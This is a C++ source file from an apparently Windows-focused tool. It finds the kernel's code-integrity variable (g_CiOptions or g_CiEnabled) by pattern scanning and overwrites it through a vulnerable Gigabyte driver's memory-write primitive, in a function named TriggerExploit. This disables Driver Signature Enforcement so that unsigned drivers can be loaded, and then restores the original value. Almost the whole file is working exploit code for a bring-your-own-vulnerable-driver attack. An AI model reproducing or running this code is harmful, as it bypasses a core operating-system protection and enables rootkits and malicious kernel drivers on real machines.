#include "../global.h"
#include "./swind2.h"
#include "gio.h"

CIOptionsState InitialCiOptionsValue = {.has_value = false, .original_value = 0, .address = nullptr};

static
bool CompareByte(const PUCHAR data, const PUCHAR pattern, UINT32 len)
{
    for (auto i = 0; i < len; i++)
    {
        if (data[i] != pattern[i] && pattern[i] != 0)
            return false;
    }
    return true;
}

static
void CheckMemoryAddress(void* address)
{
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T result = VirtualQuery(address, &mbi, sizeof(mbi));

    if (result == 0)
    {
        Log("Address %p: not present in process address space\n", address);
        return;
    }

    const char* stateStr =
        (mbi.State == MEM_COMMIT)
            ? "Committed"
            : (mbi.State == MEM_RESERVE)
            ? "Reserved"
            : (mbi.State == MEM_FREE)
            ? "Free"
            : "Unknown";

    const char* protectStr;
    switch (mbi.Protect)
    {
    case PAGE_NOACCESS: protectStr = "NoAccess";
        break;
    case PAGE_READONLY: protectStr = "ReadOnly";
        break;
    case PAGE_READWRITE: protectStr = "ReadWrite";
        break;
    case PAGE_EXECUTE: protectStr = "Execute";
        break;
    case PAGE_EXECUTE_READ: protectStr = "ExecRead";
        break;
    case PAGE_EXECUTE_READWRITE: protectStr = "ExecReadWrite";
        break;
    default: protectStr = "Other";
        break;
    }

    Log("CheckMemoryAddress for Address %p: State=%s, Protect=%s (0x%X), RegionSize=0x%zx\n",
        address, stateStr, protectStr, mbi.Protect, mbi.RegionSize);
}

static
NTSTATUS FindKernelModule(
    _In_ PCCH ModuleName,
    _Out_ PULONG_PTR ModuleBase
)
{
    *ModuleBase = 0;

    ULONG Size = 0;
    NTSTATUS Status;
    if ((Status = NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &Size)) != STATUS_INFO_LENGTH_MISMATCH)
    {
        return Status;
    }

    const PRTL_PROCESS_MODULES Modules = static_cast<PRTL_PROCESS_MODULES>(RtlAllocateHeap(
        RtlProcessHeap(), HEAP_ZERO_MEMORY, 2 * static_cast<SIZE_T>(Size)));
    Status = NtQuerySystemInformation(SystemModuleInformation,
                                      Modules,
                                      2 * Size,
                                      nullptr);
    if (!NT_SUCCESS(Status))
    {
        goto Exit;
    }

    for (ULONG i = 0; i < Modules->NumberOfModules; ++i)
    {
        RTL_PROCESS_MODULE_INFORMATION Module = Modules->Modules[i];
        if (_stricmp(ModuleName, reinterpret_cast<PCHAR>(Module.FullPathName) + Module.OffsetToFileName) == 0)
        {
            *ModuleBase = reinterpret_cast<ULONG_PTR>(Module.ImageBase);
            Status = STATUS_SUCCESS;
            break;
        }
    }

Exit:
    RtlFreeHeap(RtlProcessHeap(), 0, Modules);
    return Status;
}


// For Windows Vista/7
static
LONG QueryCiEnabled(
    _In_ PVOID MappedBase,
    _In_ SIZE_T SizeOfImage,
    _In_ ULONG_PTR KernelBase,
    _Out_ PULONG_PTR gCiEnabledAddress
)
{
    *gCiEnabledAddress = 0;

    ULONG_PTR Offset = 0;

    for (SIZE_T i = 0; i < SizeOfImage; i++)
    {
        if (CompareByte(PUCHAR(MappedBase) + i, (PUCHAR)Pattern_gCiEnabled, 4))
        {
            Offset = i;
        }
    }
    if (Offset == 0)
    {
        Log("FATAL: Failed to find CiEnabled\n");
        return 0;
    }

    LONG RealOffset = *reinterpret_cast<LONG*>((ULONG_PTR)MappedBase + Offset + 4);
    ULONG_PTR g_CiEnabled = (ULONG_PTR)MappedBase + RealOffset + Offset + 4 + 4;
    *gCiEnabledAddress = KernelBase + g_CiEnabled - (ULONG_PTR)MappedBase;
    Log("i : 0x%llx\n gCiEnabled : %llx\n gCiEnabledAddress : %llx\n");
    return 1;
}


// For Windows 8 and worse
static
LONG QueryCiOptions(
    _In_ PVOID MappedBase, // ci.dll file
    _In_ ULONG_PTR KernelBase, //ci.dll kernel base
    _Out_ PULONG_PTR gCiOptionsAddress
)
{
    *gCiOptionsAddress = 0;

    UINT64 CiInitializeAddress = (UINT64)GetProcedureAddress(reinterpret_cast<ULONG_PTR>(MappedBase), "CiInitialize");
    if (CiInitializeAddress == 0)
    {
        Log("CiInitialize was not found in ci.dll.\n");
        return 0;
    }

    const PUCHAR CiInitialize = reinterpret_cast<PUCHAR>(CiInitializeAddress);

    int Offset = 0;
    UINT16 j = 0;
    Log("OSBuildNumber: %d\n", NtCurrentPeb()->OSBuildNumber);
    // Windows 11
    if (NtCurrentPeb()->OSBuildNumber >= 26100)
    {
        for (auto i = 0; i < 255; i++)
        {
            if (CompareByte(PUCHAR(CiInitialize + i), PUCHAR(Pattern_CipInit_26100), 21))
            {
                Offset = i;
                break;
            }
        }
        if (Offset == 0)
        {
            Log("FATAL: No match was found in Pattern_CipInit_26100.\n");
            return 0;
        }
        for (j = 0; Pattern_CipInit_26100[j]; j++);
    }
    else if (NtCurrentPeb()->OSBuildNumber >= 16299)
    {
        for (auto i = 0; i < 255; i++)
        {
            if (CompareByte(PUCHAR(CiInitialize + i), PUCHAR(Pattern_CipInit_1709), 16))
            {
                Offset = i;
            }
        }
        for (j = 0; Pattern_CipInit_1709[j]; j++);
    }
    else
    {
        for (auto i = 0; i < 255; i++)
        {
            if (CompareByte(PUCHAR(CiInitialize + i), PUCHAR(Pattern_CipInit), 12))
            {
                Offset = i;
            }
        }
        for (j = 0; Pattern_CipInit[j]; j++);
    }

    if (!Offset)
    {
        Log("FATAL: Failed to find CipInitialize\n");
        return 0;
    }

    Log("CiInitializeAddress: 0x%llX, j: %d\n", CiInitializeAddress, j);

    ULONG CipInitOffset = *reinterpret_cast<UINT32*>(CiInitializeAddress + Offset + j);
    ULONG_PTR CipInitialize = CiInitializeAddress + CipInitOffset + Offset + j + 4;
    Log("CipOffset: %d,  CipInitOffset : 0x%lX, CipInitialize : 0x%llX\n", Offset, CipInitOffset, CipInitialize);
    Offset = 0;
    j = 0;

    void* address = reinterpret_cast<void*>(CipInitialize);
    CheckMemoryAddress(address);

    if (NtCurrentPeb()->OSBuildNumber >= 26100)
    {
        for (auto i = 0; i < 255; i++)
        {
            if (CompareByte(PUCHAR(CipInitialize + i), PUCHAR(Pattern_gCiOptions_26100), 12))
            {
                Offset = i;
            }
        }
        for (j = 0; Pattern_gCiOptions_26100[j]; j++);

        if (!Offset)
        {
            Log("FATAL: Failed to find Ci_gOptions\n");
            return 0;
        }
    }
    else
    {
        for (auto i = 0; i < 255; i++)
        {
            if (CompareByte(PUCHAR(CipInitialize + i), PUCHAR(Pattern_gCiOptions), 12))
            {
                Offset = i;
            }
        }
        for (j = 0; Pattern_gCiOptions[j]; j++);
        if (!Offset)
        {
            Log("FATAL: Failed to find Ci_gOptions\n");
            return 0;
        }
    }

    Log("j: %d\n", j);

    INT32 RealOffset = *reinterpret_cast<INT32*>(CipInitialize + Offset + j); // RVA 
    UINT64 g_CiOptions = CipInitialize + RealOffset + Offset + j + 4; // Calculate
    *gCiOptionsAddress = KernelBase + g_CiOptions - (UINT64)MappedBase;
    Log("Offset: %lx RealOffset : %lx  g_CiOptions : 0x%llx, *gCiOptionsAddress: 0x%llX\n", Offset, RealOffset,
        g_CiOptions, *gCiOptionsAddress);
    return 1;
}

NTSTATUS AnalyzeCi(
    _Out_ PVOID* CiOptionsAddress
)
{
    *CiOptionsAddress = nullptr;

    // Map file as SEC_IMAGE
    WCHAR Path[MAX_PATH];
    const CHAR NtoskrnlExe[] = "ntoskrnl.exe";
    const CHAR CiDll[] = "CI.dll";

    _snwprintf(Path, MAX_PATH / sizeof(WCHAR), L"%ls\\System32\\%hs",
               SharedUserData->NtSystemRoot,
               NtCurrentPeb()->OSBuildNumber >= 9200 ? CiDll : NtoskrnlExe);

    PVOID MappedBase;
    SIZE_T ViewSize;
    NTSTATUS Status = MapFileSectionView(Path, FALSE, &MappedBase, &ViewSize);
    if (!NT_SUCCESS(Status))
    {
        Log(L"FATAL: Failed to map %ls: %08X\n", Path, Status);
        return Status;
    }

    if (NtCurrentPeb()->OSBuildNumber >= 9200)
    {
        // Find CI.dll!g_CiOptions
        ULONG_PTR CiDllBase;
        Status = FindKernelModule(CiDll, &CiDllBase);
        if (!NT_SUCCESS(Status))
        {
            Log("FATAL: Failed to FindKernelModule %08X\n", Status);
            goto Exit;
        }

        ULONG_PTR gCiOptionsAddress;
        const LONG Rel = QueryCiOptions(MappedBase, CiDllBase, &gCiOptionsAddress);
        if (Rel != 0)
        {
            *CiOptionsAddress = reinterpret_cast<PVOID>(gCiOptionsAddress);
            Status = STATUS_SUCCESS;
        }
        else
        {
            Status = STATUS_NOT_FOUND;
        }
    }
    else
    {
        // Find ntoskrnl.exe!g_CiEnabled
        ULONG_PTR KernelBase;
        Status = FindKernelModule(NtoskrnlExe, &KernelBase);
        if (!NT_SUCCESS(Status))
            goto Exit;

        ULONG_PTR gCiEnabledAddress;
        const LONG Rel = QueryCiEnabled(MappedBase, ViewSize, KernelBase, &gCiEnabledAddress);
        if (Rel != 0)
        {
            *CiOptionsAddress = reinterpret_cast<PVOID>(gCiEnabledAddress);
            Status = STATUS_SUCCESS;
        }
        else
        {
            Status = STATUS_NOT_FOUND;
        }
    }

Exit:
    NtUnmapViewOfSection(NtCurrentProcess, MappedBase);
    return Status;
}

BOOLEAN IsCiEnabled()
{
    SYSTEM_CODEINTEGRITY_INFORMATION CiInfo = {sizeof(SYSTEM_CODEINTEGRITY_INFORMATION)};
    const NTSTATUS Status = NtQuerySystemInformation(SystemCodeIntegrityInformation,
                                                     &CiInfo,
                                                     sizeof(CiInfo),
                                                     nullptr);
    if (!NT_SUCCESS(Status))
        Log("Failed to query code integrity status: %08X\n", Status);

    return (CiInfo.CodeIntegrityOptions &
        (CODEINTEGRITY_OPTION_ENABLED | CODEINTEGRITY_OPTION_TESTSIGN)) == CODEINTEGRITY_OPTION_ENABLED;
}

static
NTSTATUS TriggerExploit(
    _In_ PVOID CiVariableAddress,
    _In_ ULONG CiOptionsValue,
    _Out_opt_ PULONG OldCiOptionsValue
)
{
    if (OldCiOptionsValue != nullptr)
        *OldCiOptionsValue = 0;

    const ULONG CiPatchSize = NtCurrentPeb()->OSBuildNumber >= 9200 ? sizeof(ULONG) : sizeof(UCHAR);
    NTSTATUS Status = STATUS_SUCCESS;

    // Optional: Read original value before patching
    if (OldCiOptionsValue != nullptr)
    {
        ULONG OldValue = 0;
        Status = ReadMemory(CiVariableAddress, &OldValue, CiPatchSize);
        if (!NT_SUCCESS(Status))
        {
            Log("FATAL: ReadMemory failed for g_CiOptions at %p: %08X\n", CiVariableAddress, Status);
            return Status;
        }

        *OldCiOptionsValue = OldValue;
    }

    // Prepare the value to write
    if (CiPatchSize == sizeof(ULONG))
    {
        Status = WriteMemory(CiVariableAddress, &CiOptionsValue, sizeof(ULONG));
    }
    else
    {
        UCHAR CiOptionsValueByte = static_cast<UCHAR>(CiOptionsValue);
        Status = WriteMemory(CiVariableAddress, &CiOptionsValueByte, sizeof(UCHAR));
    }

    if (!NT_SUCCESS(Status))
    {
        Log("FATAL: WriteMemory failed to patch g_CiOptions at %p: %08X\n", CiVariableAddress, Status);
    }

    return Status;
}

static
NTSTATUS TriggerRead(
    _In_ PVOID CiVariableAddress,
    _Out_opt_ PULONG OldCiOptionsValue
)
{
    if (!OldCiOptionsValue)
    {
        return STATUS_INVALID_PARAMETER;
    }

    *OldCiOptionsValue = 0;

    // Determine size of the value to read based on Windows version
    const ULONG CiPatchSize = NtCurrentPeb()->OSBuildNumber >= 9200 ? sizeof(ULONG) : sizeof(UCHAR);

    ULONG ValueBuffer = 0;

    NTSTATUS Status = ReadMemory(
        CiVariableAddress,
        &ValueBuffer,
        CiPatchSize
    );

    if (!NT_SUCCESS(Status))
    {
        Log("FATAL: ReadMemory failed for g_CiOptions at %p: %08X\n", CiVariableAddress, Status);
        return Status;
    }

    *OldCiOptionsValue = ValueBuffer;
    return STATUS_SUCCESS;
}

NTSTATUS DSEDisable()
{
    PVOID CiOptionsAddress;
    NTSTATUS Status;

    // Apply desired change
    ULONG OldCiOptionsValue = 0xFF;
    ULONG NewCiOptionsValue = 0;

    if (InitialCiOptionsValue.has_value)
    {
        Log("FATAL: CI options are already initialized, DSE is already disabled?\n");
        return STATUS_CI_OPTIONS_ALREADYINITIALIZED;
    }

    Status = AnalyzeCi(&CiOptionsAddress);
    if (!NT_SUCCESS(Status))
    {
        return Status;
    }

    Log("%ls at 0x%p.\n",
        (NtCurrentPeb()->OSBuildNumber >= 9200 ? L"CI!g_CiOptions" : L"nt!g_CiEnabled"),
        CiOptionsAddress);

    if (!IsCiEnabled())
    {
        Log("WARNING: CI is already disabled\n");
        return STATUS_SUCCESS;
    }

    Status = TriggerExploit(CiOptionsAddress, NewCiOptionsValue, &OldCiOptionsValue);

    if (!NT_SUCCESS(Status))
    {
        Log("Disabling DSE through Gigabyte loader driver failed: %08X\n", Status);
        return Status;
    }

    InitialCiOptionsValue.has_value = true;
    InitialCiOptionsValue.original_value = OldCiOptionsValue;
    InitialCiOptionsValue.address = CiOptionsAddress;

    Log("Successfully disabled DSE.\n");
    Log("Original g_CiOptions value: 0x%X.\n", OldCiOptionsValue);
    return Status;
}

NTSTATUS DSEEnable()
{
    // Validate state
    if (!InitialCiOptionsValue.has_value)
    {
        Log("FATAL: CI options are NOT initialized, DSE is not disabled?\n");
        return STATUS_CI_OPTIONS_UNINITIALIZED;
    }

    // Apply desired change
    ULONG OldCiOptionsValue = 0xFF;
    ULONG NewCiOptionsValue = InitialCiOptionsValue.original_value;

    if (IsCiEnabled())
    {
        Log("WARNING: CI is already enabled.\n");
        InitialCiOptionsValue.has_value = false;
        InitialCiOptionsValue.address = 0;
        InitialCiOptionsValue.original_value = 0;
        return STATUS_SUCCESS;
    }

    NTSTATUS Status = TriggerExploit(InitialCiOptionsValue.address, NewCiOptionsValue, &OldCiOptionsValue);

    if (!NT_SUCCESS(Status))
    {
        Log("Re-enabling DSE through Gigabyte loader driver failed: %08X\n", Status);
        return Status;
    }

    InitialCiOptionsValue.has_value = false;
    InitialCiOptionsValue.address = 0;
    InitialCiOptionsValue.original_value = 0;

    Log("Successfully re-enabled DSE.\n");
    Log("Original g_CiOptions value: 0x%X.\n", OldCiOptionsValue);
    return Status;
}

NTSTATUS DSEChangeState(BOOLEAN enable)
{
    return enable ? DSEEnable() : DSEDisable();
}

NTSTATUS ReadCIOptionsFromMemory(
    _Out_opt_ PULONG ciOptionsValue)
{
    Log(L"Reading CI options value...\n");

    PVOID ciOptionsAddress;
    NTSTATUS status = AnalyzeCi(&ciOptionsAddress);
    if (!NT_SUCCESS(status))
    {
        Log("FATAL: Could not get CI address\n");
        return status;
    }

    Log(L"Executing read @ 0x%llX via the driver\n", ciOptionsAddress);
    status = TriggerRead(ciOptionsAddress, ciOptionsValue);
    Log(L"Read status @ 0x%llX: 0x%08X, CI options value: 0x%08X\n", ciOptionsAddress, status,
        ciOptionsValue ? *ciOptionsValue : 0);
    return status;
}


NTSTATUS WindLoadDriver(
    _In_ PWCHAR DriverFilePath,
    _In_ BOOLEAN Hidden)
{
    WCHAR resolvedFilePath[MAX_PATH];
    WCHAR serviceName[MAX_PATH];
    NTSTATUS status;

    Log("Resolving full path to the driver @ %ls\n", DriverFilePath);
    status = RtlGetFullPathName_UEx(DriverFilePath, MAX_PATH * sizeof(WCHAR), resolvedFilePath, nullptr, nullptr);
    if (!NT_SUCCESS(status))
    {
        Log("FATAL: Failed to expand loader name into loader path, status %08X, name: %ls.\n", status, DriverFilePath);
        return status;
    }

    Log("Checking that driver exists @ %ls\n", resolvedFilePath);
    if (GetFileAttributesW(resolvedFilePath) == INVALID_FILE_ATTRIBUTES)
    {
        Log(L"FATAL: Driver file does not exist: %ls\n", resolvedFilePath);
        return STATUS_OBJECT_NAME_NOT_FOUND;
    }

    //CreateDriverService initializes serviceName buffer
    Log("Creating driver service for %ls\n", resolvedFilePath);
    status = GerOrCreateDriverService(serviceName, resolvedFilePath);
    if (!NT_SUCCESS(status))
    {
        Log(L"FATAL: Could not create driver service, status %08X, serviceName: %ls, loaderPath: %ls\n", status,
            serviceName,
            resolvedFilePath);
        return status;
    }
    Log("Driver service name for %ls is %ls\n", resolvedFilePath, serviceName);

    std::unique_ptr<PrivilegeGuard> loadDriver = EnableLoadDriverPrivilege();
    status = loadDriver->Status();
    if (!NT_SUCCESS(status))
    {
        Log(L"FATAL: Could not get driver load privileges, status %08X, serviceName: %ls, loaderPath: %ls\n", status,
            serviceName,
            resolvedFilePath);
        return status;
    }

    BOOL dseTemporarilyDisabled;
    if (IsCiEnabled())
    {
        Log("Disabling DSE before loading the driver\n");
        status = DSEChangeState(false);
        if (!NT_SUCCESS(status))
        {
            Log(L"FATAL: Could not disable DSE, status %08X, serviceName: %ls, loaderPath: %ls\n", status,
                serviceName,
                resolvedFilePath);
            goto Exit;
        }
        Log("Disabled CI, proceeding to load the driver\n");
        dseTemporarilyDisabled = true;
    }
    else
    {
        Log("WARNING: CI is already disabled, proceeding to load the driver!\n");
        dseTemporarilyDisabled = false;
    }

    Log("Loading driver via service %ls\n", serviceName);
    status = LoadDriver(serviceName);
    if (!NT_SUCCESS(status))
    {
        if (status == STATUS_IMAGE_ALREADY_LOADED)
        {
            // Already loaded - attempt to reload
            status = UnloadDriver(serviceName);
            if (!NT_SUCCESS(status))
            {
                Log("Target driver is already loaded, and unloading failed with status %08X\n", status);
            }
            else
            {
                status = LoadDriver(serviceName);
                if (!NT_SUCCESS(status))
                {
                    Log("Failed to reload target driver %ls: %08X\n", serviceName, status);
                }
                else
                {
                    Log("Successfully reloaded target driver %ls.\n", serviceName);
                }
            }
        }
        else if (status == STATUS_OBJECT_NAME_NOT_FOUND)
        {
            Log("FATAL: Failed to load target driver - object name not found, probably service creation went wrong: %08X\n", status);
        }
        else
        {
            Log("FATAL: Failed to load target driver: %08X\n", status);
        }
    }
    else
    {
        Log("Target driver loaded successfully.\n");
    }

    if (dseTemporarilyDisabled)
    {
        Log("Re-enabling DSE\n");
        NTSTATUS reenablementStatus = DSEChangeState(true);
        if (!NT_SUCCESS(reenablementStatus))
        {
            Log(L"WARNING: Could not re-enable DSE, status %08X, serviceName: %ls, loaderPath: %ls\n",
                reenablementStatus,
                serviceName,
                resolvedFilePath);
            //not much we can do about it at that point, just go to the cleanup
        }
    }

Exit:
    if (!NT_SUCCESS(status) || Hidden)
    {
        //DeleteService(serviceName);
    }

    return status;
}

NTSTATUS WindUnloadDriver(
    _In_ PWCHAR DriverFilePath)
{
    WCHAR DriverFullPath[MAX_PATH];
    WCHAR DriverServiceName[MAX_PATH];
    NTSTATUS status;

    status = RtlGetFullPathName_UEx(DriverFilePath, MAX_PATH * sizeof(WCHAR), DriverFullPath, nullptr, nullptr);
    if (!NT_SUCCESS(status))
    {
        Log("FATAL: Failed to expand loader name into loader path, Name: %ls.\n", DriverFilePath);
        return status;
    }

    std::unique_ptr<PrivilegeGuard> loadDriver = EnableLoadDriverPrivilege();

    // Create the target driver service
    status = GerOrCreateDriverService(DriverServiceName, DriverFullPath);
    if (!NT_SUCCESS(status))
    {
        Log(L"FATAL: Could not create driver service, serviceName: %ls, loaderPath: %ls\n", DriverServiceName,
            DriverFullPath);
        return status;
    }
    FileNameToServiceName(DriverServiceName, DriverFilePath);

    Log("Unloading the driver %ls", DriverServiceName);
    status = UnloadDriver(DriverServiceName);
    if (NT_SUCCESS(status))
    {
        Log("Removing the service %ls", DriverServiceName);
        DeleteService(DriverServiceName);
    }
    return status;
}
